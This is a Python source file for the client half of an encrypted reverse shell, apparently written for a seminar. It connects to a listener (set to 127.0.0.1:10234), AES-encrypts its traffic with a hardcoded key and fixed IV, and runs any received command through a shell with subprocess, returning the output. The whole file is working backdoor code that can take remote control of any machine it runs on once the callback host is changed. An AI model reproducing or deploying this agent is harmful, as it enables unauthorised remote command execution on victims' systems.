import base64
import os
import socket
import subprocess
import time

from Cryptodome.Cipher import AES

class Client:
    def __init__(self):
        self.encode_aes = lambda crypt_str, plain_str: base64.b64encode(crypt_str.encrypt(plain_str.encode()))
        self.decode_aes = lambda crypt_str, encrypt_str: crypt_str.decrypt(base64.b64decode(encrypt_str)).decode()

        self.host = '127.0.0.1'
        self.port = 10234

        self.active = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))

        self.secret = 'Ac0uIRx1XsMvoAEQ'

    def __del__(self):
        self.sock.close()

    def send(self, cmd, end="SSGSEMINAR"):
        self.cipher = AES.new(self.secret.encode(), AES.MODE_CFB, '0000000000000000'.encode())
        print(cmd)
        self.sock.sendall(self.encode_aes(self.cipher, cmd+end))
    
    def recv(self, end="SSGSEMINAR"):
        self.cipher = AES.new(self.secret.encode(), AES.MODE_CFB, '0000000000000000'.encode())
        recv_data = self.sock.recv(1024)
        data = ''
        while True:
            decrypted = self.decode_aes(self.cipher, recv_data)
            data += decrypted
            if data.endswith(end):
                break
            else:
                recv_data = self.sock.recv(1024)
        return data[:-len(end)]

def exec(cmd):
    if cmd:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = process.stdout.read() + process.stderr.read()
        return result.decode()
    else:
        return None

def main():
    try:
        client = Client()
        data = client.recv()
        while True:
            if data == 'interactive':
                print(data)
                client.active = True
                client.send('$ ')
                time.sleep(5)

            while client.active:
                data = client.recv()

                if not len(data):
                    time.sleep(3)

                if data == 'quit' or data == 'terminate':
                    print('b')
                    client.send('quit')
                    break

                elif data.startswith('cd '):
                    try:
                        os.chdir(data[3:])
                        stdout = ''
                    except:
                        stdout = 'error open directory'
                else:
                    stdout = exec(data)
                
                stdout = '%s\n$ ' % (stdout)
                client.send(stdout)
    except socket.error:
        del client

if __name__ == '__main__':
    main()